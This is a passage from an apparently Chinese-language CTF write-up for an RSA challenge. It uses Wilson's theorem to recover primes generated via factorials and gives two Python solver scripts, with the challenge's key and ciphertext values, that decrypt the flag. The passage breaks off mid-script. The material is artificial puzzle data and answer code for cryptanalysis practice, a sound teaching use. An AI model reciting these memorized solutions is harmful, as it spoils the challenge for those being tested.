<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">#伽马函数Γ</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>和阶乘x<span class="token operator">!</span>的关系式</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">gamma</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>#威尔逊定理</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">当且仅当p为素数时：</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span> ≡ <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">(</span>mod p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">推论：</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span> ≡ <span class="token number">1</span> <span class="token punctuation">(</span>mod p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>#欧拉函数</pre></td></tr><tr><td data-num="9"></td><td><pre>若n是质数p的k次幂，phi <span class="token operator">=</span> p<span class="token operator">**</span>k <span class="token operator">-</span> p<span class="token operator">**</span><span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>我们需要求 <code>gamma(B+2)%A</code> ，根据伽马函数 Γ(x) 和阶乘 x! 的关系式可知 <code>(B+1)! % A</code> 。<br />
而根据威尔逊定理可知 <code>(A-2)! % A = 1</code> 。<br />
令 <code>x = (A-2)!/(B+1)!``，y = (B+1)!</code> ，所以 <code>x * y ≡ 1 (mod A)。</code> <br />
而我们需要求的是 <code>y % A</code> ，y 是 x 关于 A 的逆元。所以求 <code>x % A</code>  的逆元即可，用欧几里得法求逆.</p>
<p><strong>exp1</strong>:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="3"></td><td><pre>from math <span class="token keyword">import</span> gamma</pre></td></tr><tr><td data-num="4"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> isPrime</pre></td></tr><tr><td data-num="5"></td><td><pre>#参考大佬的exp完善了一下，<span class="token number">2333</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>def <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token constant">A</span> <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token constant">B</span> <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token constant">A</span> <span class="token operator">-</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1e4</span><span class="token punctuation">,</span> <span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma</span><span class="token punctuation">(</span><span class="token constant">B</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token constant">A</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>def <span class="token function">nextPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">while</span> not <span class="token function">isPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        n <span class="token operator">+=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">return</span> n</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>def <span class="token function">getNewPrime2</span><span class="token punctuation">(</span><span class="token constant">A</span><span class="token punctuation">,</span> <span class="token constant">B</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma2</span><span class="token punctuation">(</span><span class="token constant">B</span><span class="token punctuation">,</span> <span class="token constant">A</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>def <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">while</span> a <span class="token operator">!=</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b <span class="token operator">%</span> a<span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> b</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>def <span class="token function">findModReverse</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token operator">:</span>  # 这个扩展欧几里得算法求模逆</pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">if</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">return</span> None</pre></td></tr><tr><td data-num="29"></td><td><pre>    u1<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> u3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> a</pre></td></tr><tr><td data-num="30"></td><td><pre>    v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> m</pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">while</span> v3 <span class="token operator">!=</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        q <span class="token operator">=</span> u3 <span class="token comment">// v3</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> u3 <span class="token operator">=</span> <span class="token punctuation">(</span>u1 <span class="token operator">-</span> q <span class="token operator">*</span> v1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>u2 <span class="token operator">-</span> q <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>u3 <span class="token operator">-</span> q <span class="token operator">*</span> v3<span class="token punctuation">)</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3</pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">return</span> u1 <span class="token operator">%</span> m</pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>def <span class="token function">gamma2</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    res <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    # <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"final: "</span><span class="token operator">+</span><span class="token function">str</span><span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span>b <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> a <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        res <span class="token operator">=</span> <span class="token punctuation">(</span>res <span class="token operator">*</span> <span class="token function">findModReverse</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> a</pre></td></tr><tr><td data-num="41"></td><td><pre>    # <span class="token function">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">return</span> res</pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="45"></td><td><pre>pA <span class="token operator">=</span> <span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789</span></pre></td></tr><tr><td data-num="46"></td><td><pre>pB <span class="token operator">=</span> <span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147</span></pre></td></tr><tr><td data-num="47"></td><td><pre>qA <span class="token operator">=</span> <span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291</span></pre></td></tr><tr><td data-num="48"></td><td><pre>qB <span class="token operator">=</span> <span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457</span></pre></td></tr><tr><td data-num="49"></td><td><pre>n <span class="token operator">=</span> <span class="token number">4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119</span></pre></td></tr><tr><td data-num="50"></td><td><pre>c <span class="token operator">=</span> <span class="token number">1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>pA</pre></td></tr><tr><td data-num="53"></td><td><pre>p <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="54"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>	p <span class="token operator">=</span> p <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pA<span class="token punctuation">)</span> <span class="token operator">%</span> pA</pre></td></tr><tr><td data-num="57"></td><td><pre>p <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>qA</pre></td></tr><tr><td data-num="60"></td><td><pre>q <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="61"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>	q <span class="token operator">=</span> q <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>qA<span class="token punctuation">)</span> <span class="token operator">%</span> qA</pre></td></tr><tr><td data-num="64"></td><td><pre>q <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="66"></td><td><pre>#p <span class="token operator">=</span> <span class="token number">721295413363782943575290202453254405609384962866760177823574558139524613289380285395875654962467791028293949737699221240830187032744030384932819874799211</span></pre></td></tr><tr><td data-num="67"></td><td><pre>#q <span class="token operator">=</span> <span class="token number">3112046822677655775872849946553212669700408142233774149727014153992463597788397754366224491840784669131576610049264423785236897140841668817147645049635999</span></pre></td></tr><tr><td data-num="68"></td><td><pre></pre></td></tr><tr><td data-num="69"></td><td><pre>fn <span class="token operator">=</span> <span class="token function">getNewPrime2</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="70"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>#fn <span class="token operator">=</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="72"></td><td><pre>r <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">iroot</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span><span class="token function">mpz</span><span class="token punctuation">(</span>n<span class="token comment">//(p*q*q)),3)[0]</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>#r <span class="token operator">=</span> <span class="token number">8605581006163978513558138296576032102733660218879126657600237911024254611499452345790192297532366960817162346945271546520036031830535178172751208076290109</span></pre></td></tr><tr><td data-num="75"></td><td><pre></pre></td></tr><tr><td data-num="76"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">*</span> q <span class="token operator">-</span> q<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> r <span class="token operator">*</span> r <span class="token operator">-</span> r <span class="token operator">*</span> r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="78"></td><td><pre><span class="token function">#print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>#d<span class="token operator">=</span><span class="token number">3893796118845369439235581551299559681130294433914324573287346480568253612056224380636546037500153379857589128641230243165297526124111655151656456885394718320571011164662139031101601805935834789093718455506105414382703229813895443438508544153175032701351201540968823002419519523214390287666578730407931246445871807183537209694071828922295499346083880163169003198594519162159452952535381034048239423912932288087394862004236172433929593269810986943713662824358214779552898877881697861535560993274391395357266197384454357803117633435524780866783488594161973423232638616086772861225974312225600055495130373828730995856136891951667049900975798958834487417185610258985145585210434281769923883162243531194314167637519779543778335295761192135358383400455687647479329697758466764046259467201396085554561420952266156396111233306174055533779858729332820780458072338771340688204365931674201918683102590056383442579221021315973279544753</span></pre></td></tr><tr><td data-num="80"></td><td><pre>m <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="81"></td><td><pre></pre></td></tr><tr><td data-num="82"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span><span class="token function">unhexlify</span><span class="token punctuation">(</span><span class="token function">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><strong>exp2</strong>:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#纯大佬exp，小编xue微改了一下运行中出现的问题，大佬勿怪</pre></td></tr><tr><td data-num="2"></td><td><pre>from math <span class="token keyword">import</span> gamma</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="6"></td><td><pre>from Cryptodome<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">nextPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> not <span class="token function">isPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        n <span class="token operator">+=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> n</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>def <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token constant">A</span> <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token constant">B</span> <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token constant">A</span> <span class="token operator">-</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1e4</span><span class="token punctuation">,</span><span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma</span><span class="token punctuation">(</span><span class="token constant">B</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token constant">A</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>pA<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789</span></pre></td></tr><tr><td data-num="20"></td><td><pre>pB<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147</span></pre></td></tr><tr><td data-num="21"></td><td><pre>qA<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291</span></pre></td></tr><tr><td data-num="22"></td><td><pre>qB<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="25"></td><td><pre>n<span class="token operator">=</span><span class="token number">4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119</span></pre></td></tr><tr><td data-num="26"></td><td><pre>c<span class="token operator">=</span><span class="token number">1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>pA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>pA</pre></td></tr><tr><td data-num="29"></td><td><pre>p <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="30"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>pA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>pB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	p <span class="token operator">=</span> p <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>pA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pA<span class="token punctuation">)</span> <span class="token operator">%</span> pA</pre></td></tr><tr><td data-num="33"></td><td><pre>p <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token function">#求</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token operator">/</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">的逆元，等于</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">)</span><span class="token operator">%</span>qA <span class="token function">，等于gamma</span><span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>qA</pre></td></tr><tr><td data-num="35"></td><td><pre>q <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="36"></td><td><pre>max <span class="token operator">=</span> <span class="token punctuation">(</span>qA<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>qB<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>max<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre>	q <span class="token operator">=</span> q <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span><span class="token function">invert</span><span class="token punctuation">(</span><span class="token punctuation">(</span>qA<span class="token operator">-</span>i<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>qA<span class="token punctuation">)</span> <span class="token operator">%</span> qA</pre></td></tr><tr><td data-num="39"></td><td><pre>q <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td 